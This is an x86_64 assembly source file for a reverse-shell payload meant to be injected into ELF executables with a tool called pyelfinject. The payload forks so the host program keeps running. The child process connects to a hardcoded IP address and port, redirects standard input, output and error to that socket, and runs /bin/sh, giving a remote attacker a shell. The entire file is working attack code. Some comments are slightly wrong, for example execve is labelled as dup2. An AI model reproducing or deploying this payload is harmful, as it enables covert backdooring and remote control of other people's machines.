; x86_64 reverse-shell assembly code
; for use with pyelfinject
; assemble with: nasm -f bin -o reverse.bin reverse_shell.s

BITS 64

SECTION .text
global main

main:
    push rax                ; save registers
    push rcx
    push rdx
    push rsi
    push rdi
    push r11

    mov rax, 57             ; fork syscall number
    syscall                 ; fork()
    cmp rax, 0
    je connect_back         ; jump to connect-back code if child process

cleanup:
    pop r11                 ; restore registers
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rax

    ; jump to original entry point
    call get_pc
get_pc:
    pop rcx
    sub rcx, 0x12345678
    push rcx
    ret

connect_back:
    mov rax, 41             ; socket syscall number
    mov rdi, 2              ; domain AF_INET = 2
    mov rsi, 1              ; type SOCK_STREAM (TCP)
    mov rdx, 0              ; protocol
    syscall                 ; socket(AF_INET,SOCK_STREAM,0)

    mov r10, rax            ; save FD for later

    push DWORD 0x2001a8c0   ; IP address in reverse
    push WORD 0x611e        ; Port
    push WORD 0x2           ; AF_INET = 2

    mov rax, 42             ; connect syscall number
    mov rdi, r10            ; saved socket FD
    mov rsi, rsp            ; pointer to sockaddr struct constructed on stack
    mov rdx, 0x16           ; length of IP address
    syscall                 ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

    mov rax, 33             ; dup2 syscall number
    mov rdi, r10            ; saved FD
    mov rsi, 0              ; STDIN file descriptor
    syscall                 ; dup2(FD, 0);
    
    mov rax, 33             ; dup2 syscall number
    mov rdi, r10            ; saved FD
    mov rsi, 1              ; STDOUT file descriptor
    syscall                 ; dup2(FD, 1);
    
    mov rax, 33             ; dup2 syscall number
    mov rdi, r10            ; saved FD
    mov rsi, 2              ; STDERR file descriptor
    syscall                 ; dup2(FD, 2);

    mov rax, 59             ; dup2 syscall number
    lea rdi,[rel $+shell-$]
    mov rsi, 0
    mov rdx, 0
    syscall                 ; execve("/bin/sh", 0, 0);

shell: db "/bin/sh",0
